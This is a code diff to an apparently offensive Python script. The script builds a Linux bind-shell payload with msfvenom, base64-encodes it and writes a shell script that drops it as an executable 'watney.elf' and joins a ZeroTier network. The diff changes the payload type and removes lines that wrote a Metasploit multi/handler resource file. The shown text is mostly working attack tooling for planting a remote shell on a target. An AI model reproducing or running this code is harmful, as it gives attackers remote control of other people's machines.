@@ -84,7 +84,7 @@ d = json.loads(response.text)
 local_ip = d.get('ipAssignments')[0]
 print(f'local IP: {local_ip}')
 
-command = f'msfvenom -p linux/x64/bind_reverse_tcp LHOST=0.0.0.0 LPORT=1337 -f elf'
+command = f'msfvenom -p linux/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=1337 -f elf'
 output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
 encoded = base64.b64encode(output.stdout)
 shell_text = 'echo "' + encoded.decode() + '" | base64 -d > watney.elf && chmod +x watney.elf'
@@ -94,17 +94,8 @@ script.insert(7, f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
 with open('prod/martian.sh', 'w') as f:
         for line in script:
             f.write(line)
-log.print_general('Script written')
+log.print_general('Script written to prod/martian.sh')
 
-# Create metasploit config settings
-with open('prod/msf-settings.rc', 'w') as f:
-    f.write('workspace GALAXY\n')
-    f.write('use exploit/multi/handler\n')
-    f.write(f'set LHOST {local_ip}\n')
-    f.write('set LPORT 1337\n')
-    f.write('exploit\n')
-log.print_general('Metasploit configuration written to prod/msf-settings.rc')
-log.print_success('Launch metasploit in a new window:\t"msfconsole -r prod/msf-settings.rc"')
 
 # Start trying to authorize new members
 
